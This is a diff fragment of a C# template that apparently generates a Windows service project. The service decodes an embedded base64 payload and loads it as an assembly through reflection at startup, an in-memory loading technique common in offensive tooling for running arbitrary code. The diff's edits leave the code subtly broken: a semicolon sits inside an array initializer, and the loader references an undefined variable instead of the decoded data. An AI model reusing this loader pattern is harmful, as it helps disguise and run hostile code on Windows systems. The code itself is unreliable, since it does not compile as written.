@@ -733,7 +733,7 @@ using System.Runtime.InteropServices;
     <DefineConstants>TRACE</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
-      <PostBuildEventUseInBuild>true</PostBuildEventUseInBuild>
+    <PostBuildEventUseInBuild>true</PostBuildEventUseInBuild>
   </PropertyGroup>
   <ItemGroup>
     <Reference Include=""System"" />
@@ -784,7 +784,7 @@ namespace {2}
 
         protected override void OnStart(string[] args)
         {{
-            byte[]  data = System.Convert.FromBase64String(""{4}"")
+            byte[]  data = System.Convert.FromBase64String(""{4}"");
             Assembly a = Assembly.Load(myapp);
             Type myType = a.GetType(TargetAssemblyName);
             MethodInfo myMethod = myType.GetMethod(TargetMethodName);
@@ -850,7 +850,7 @@ namespace {2}
             ServiceBase[] ServicesToRun;
             ServicesToRun = new ServiceBase[]
             {{
-                new {3}()
+                new {3}();
             }};
             ServiceBase.Run(ServicesToRun);
         }}
